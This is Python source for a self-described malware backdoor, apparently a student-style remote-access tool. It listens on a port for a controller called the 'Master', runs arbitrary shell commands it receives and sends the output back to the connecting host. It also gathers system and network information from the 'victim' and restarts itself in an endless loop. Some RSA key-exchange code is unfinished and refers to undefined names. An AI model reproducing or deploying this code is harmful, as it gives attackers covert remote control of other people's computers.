import threading
import time
import socket
import sys
import os
import subprocess
import platform

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

remote_public_key = None
public_key_pem = None
private_key = None


class Commands:
    """
    This module gets info from the victim Operating System
    """
    def ip():
        if platform.system() == 'Windows':
            return subprocess.check_output('ipconfig /all', shell=True).decode('cp850')
        else:
            return subprocess.check_output('ip addr show', shell=True).decode('UTF-8')

    def system():
        return platform.uname()

    def platform():
        return platform.platform().replace('-', ' ')

    def pid():
        return "Process ID :", os.getpid()


class InThread(threading.Thread):
    """
    This Thread receives and executes the Master's commands
    Invoked by the Malware Thread
    """
    IN_PORT = 44455
    OUT_PORT = 44444

    def __init__(self, in_port=IN_PORT, out_port=OUT_PORT):
        super().__init__()
        self.in_port = in_port
        self.out_port = out_port
        self.socket = socket.socket()
        self.listen()

    def listen(self):
        try:
            self.socket.bind(('', self.in_port))
            self.socket.listen(5)
            print('listening for incoming traffic')
            self.start()
        except socket.timeout:
            self.listen()

    def run(self):
        conn, in_ip = self.socket.accept()
        print('connection received')
        #self.init_public_key()
        cons = OutThread(in_ip, self.out_port)
        again = True
        while again:
            msg = conn.recv(1024).decode('UTF-8')
            print(msg)
            if msg == 'exit':
                again = False
                cons.send(msg)
            elif msg == 'shell':
                comm_again = True
                while comm_again:
                    command = conn.recv(1024).decode('UTF-8')
                    print(command)
                    if command == '':
                        pass
                    elif command == 'exit':
                        comm_again = False
                    else:
                        try:
                            #resp = subprocess.check_output(command.split(), shell=True)
                            print(command)
                            #print(resp)
                            if platform.system() == 'Windows':
                                resp = subprocess.check_output(command.split(), shell=True)
                                cons.send(resp.decode('cp850'))
                            else:
                                resp = subprocess.check_output(command, shell=True)
                                cons.send(resp.decode('UTF-8'))
                        except subprocess.CalledProcessError:
                            cons.send("Impossible d'exécuter cette commande")
            elif msg[:4] == 'info':
                known_comm = ['sysinfo', 'ip', 'platform', 'pid']
                if msg[5:] == 'sysinfo':
                    resp = ' '.join(Commands.system())
                elif msg[5:] == 'ip':
                    resp = Commands.ip()
                elif msg[5:] == 'platform':
                    resp = Commands.platform()
                elif msg[5:] == 'pid':
                    resp = Commands.pid()
                else:
                    resp = ('List of available information gathering commands : info + [{}]'.format(known_comm))
                cons.send(str(resp))
        cons.stop()
        #self.socket.shutdown(socket.SHUT_RDWR)
        self.socket.close()
        print('closed IN')
        print('Closed socket coming from {}'.format(in_ip))

    def init_public_key(self):
        try:
            remote_public_key_pem = connection.recv(InThread.BUFFER_SIZE)
            global remote_public_key
            remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
            print("Remote public key successfully loaded")
        except timeout:
            self.init_public_key()
        except ValueError:
            print("Invalid Public Key received")

    # Used to be called decrypt
    def rsa_decrypt(self,ciphertext):
        global private_key
        return private_key.decrypt(ciphertext,
                                padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None))


class OutThread(threading.Thread):
    """
    This Thread sends the answers to the commands received in InThread
    Invoked by the InThread
    """
    def __init__(self, ip, out_port):
        super().__init__()
        self.ip = ip
        self.out_port = out_port

        try:
            self.sock = socket.socket()
            self.sock.connect((self.ip[0], self.out_port))
        except ConnectionError:
            print('Unable to connect to {}'.format(self.ip))

        #self.send_public_keys()

    def send(self, message):
        try:
            #print('sending', message)
            self.sock.sendall(message.encode('UTF-8'))
        except ConnectionError:
            print('Unable to send <<{}>> to {}'.format(message, self.ip))

    def stop(self):
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()
        print('closed OUT')

    def send_public_keys(self):
        try:
            global public_key_pem
            self.sock.sendall(public_key_pem)
        except ConnectionError:
            print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
            self.send_public_keys()

    # Method used to be called encrypt
    def rsa_encrypt(self, message):
        global remote_public_key
        return remote_public_key.encrypt(message,
                                         padding.OAEP(
                                             mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                             algorithm=hashes.SHA256(),
                                             label=None))


class Malware(threading.Thread):
    """
    Main Thread : invokes the InThread and waits for it to close
    Generates the public and private keys
    """
    def __init__(self):
        super().__init__()

        self.prod = InThread()

        global private_key
        global public_key_pem
        private_key = self.generate_rsa_keys()
        public_key_pem = self.serialize_public_key(private_key.public_key())
        self.start()
        print('started Malware')

    def run(self):
        if self.prod.is_alive():
            print('waiting for IN to stop')
            self.prod.join()
            print('IN joined MAIN')

    def stop(self):
        self.prod.stop()

    def generate_rsa_keys(self):
        return rsa.generate_private_key(backend=default_backend(),
                                               public_exponent=65537,
                                               key_size=2048)

    def serialize_public_key(self,public_key):
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)


while True:
    """
    Program runs indefinitely. Malware is Invoked everytime it finishes the previous execution
    """
    malw = Malware()
    time.sleep(2)
    malw.join()

